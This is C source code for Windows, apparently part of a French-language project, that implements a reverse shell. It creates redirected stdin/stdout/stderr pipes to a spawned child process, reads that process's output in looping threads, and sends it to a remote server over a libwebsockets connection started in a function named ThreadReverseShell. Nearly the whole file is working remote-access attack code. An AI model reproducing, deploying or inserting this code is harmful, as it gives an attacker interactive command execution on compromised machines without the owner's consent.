#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************/
//MODIFIER CETTE FONCTION POUR UNE GESTION D'ERREUR
BOOL CreatePipes(WebSocketData* wsData)
{
    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT. 
    if (!CreatePipe(&wsData->hChildStd_Output_Rd, &wsData->hChildStd_Output_Wr, &saAttr, 0))
        return FALSE;

    // Use to inherit the object handle
    if (!SetHandleInformation(wsData->hChildStd_Output_Rd, HANDLE_FLAG_INHERIT, 0))
        return FALSE;

    // Create a pipe for the child process's STDERR. 
    if (!CreatePipe(&wsData->hChildStd_Err_Rd, &wsData->hChildStd_Err_Wr, &saAttr, 0))
        return FALSE;

    // Use to inherit the object handle
    if (!SetHandleInformation(wsData->hChildStd_Err_Rd, HANDLE_FLAG_INHERIT, 0))
        return FALSE;

    // Create a pipe for the child process's STDIN. 
    if (!CreatePipe(&wsData->hChildStd_Input_Rd, &wsData->hChildStd_Input_Wr, &saAttr, 0))
        return FALSE;

    // Use to inherit the object handle
    if (!SetHandleInformation(wsData->hChildStd_Input_Wr, HANDLE_FLAG_INHERIT, 0))
        return FALSE;

    return TRUE;
}
/********************************************************************************************************************************/
INT CreateChildProcess(LPCWSTR processName, WebSocketData* wsData)
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{
    PROCESS_INFORMATION piProcInfo = { 0 };
    STARTUPINFO siStartInfo = { 0 };
    BOOL bSuccess = FALSE;


    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.

    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = wsData->hChildStd_Err_Wr;
    siStartInfo.hStdOutput = wsData->hChildStd_Output_Wr;
    siStartInfo.hStdInput = wsData->hChildStd_Input_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 

    bSuccess = MyCreateProcessW(processName,
        (LPWSTR)processName,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

    if (bSuccess)
    {
        wsData->hCmdProcess = piProcInfo.hProcess;
        CloseHandle(piProcInfo.hThread);
    }

    return bSuccess;
}
/********************************************************************************************************************************/
BOOL WriteToPipe(LPSTR command, HANDLE handle)
{
    DWORD dwWritten;
    BOOL bSuccess = FALSE;
    SetLastError(0);
    if (WriteFile(handle, command, (DWORD)strlen(command), &dwWritten, NULL) == 0)
    {
        printf("Failed");
        return FALSE;
    }

    bSuccess = GetLastError();

    return TRUE;
}
/********************************************************************************************************************************/
BOOL ReadFromPipe(HANDLE handle, LPSTR buffer, SIZE_T length)
{
    DWORD dwRead = 0;
    BOOL bSuccess = FALSE;

    SetLastError(0);

    //if (!ReadFile(wsData->hChildStd_Output_Rd, buffer, (DWORD)length, &dwRead, NULL))
    if (!ReadFile(handle, buffer, (DWORD)length, &dwRead, NULL))
    {
        printf("ReadFile fails - GetLastError(%d)\n", GetLastError());
        return FALSE;
    }

    bSuccess = GetLastError();
    PrintError((LPSTR)"ReadFromPipe", bSuccess);
    return TRUE;
}
/********************************************************************************************************************************/
VOID PrintError(LPSTR text, INT err)
{
    DWORD retSize;
    LPSTR pTemp = NULL;

    if (!err) return;

    retSize = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ARGUMENT_ARRAY,
                                NULL, err, LANG_NEUTRAL, (LPSTR)&pTemp, 0, NULL);


    if (pTemp) printf("%s: %s\n", text, pTemp);
    LocalFree((HLOCAL)pTemp);
}
/********************************************************************************************************************************/
DWORD WINAPI ReadStdoutProc(HANDLE wsData)
{
    while (TRUE)
    {
        CHAR buffer[LWS_PRE + BUFSIZE] = { 0 };
        if (ReadFromPipe(((WebSocketData*)wsData)->hChildStd_Output_Rd, buffer, sizeof(buffer)) == FALSE)
        {
            printf("Failed to read from stdout in the created thread");
        }

        printf("%s", buffer);
        lws_write(((WebSocketData*)wsData)->socket, (LPBYTE)buffer, strlen(buffer), LWS_WRITE_BINARY);
    }

    ExitThread(0);
}
/********************************************************************************************************************************/
DWORD WINAPI ReadStderrProc(HANDLE wsData)
{
    while (TRUE)
    {
        CHAR buffer[LWS_PRE + BUFSIZE] = { 0 };
        if (ReadFromPipe(((WebSocketData*)wsData)->hChildStd_Err_Rd, buffer, sizeof(buffer)) == FALSE)
        {
            printf("Failed to read from stderr in the created thread");
        }

        printf("%s", buffer);
        lws_write(((WebSocketData*)wsData)->socket, (LPBYTE)buffer, strlen(buffer), LWS_WRITE_BINARY);
    }

    ExitThread(0);
}
/********************************************************************************************************************************/
DWORD WINAPI ThreadReverseShell()
{
    if (!WebSocketConnection())
    {
        printf("Failed to initiate connection with the server\n");
        ExitThread(EXIT_FAILURE);
    }

    printf("Reverse Shell terminé\n");
    ExitThread(EXIT_SUCCESS);
}
/********************************************************************************************************************************/

EXTERN_C_END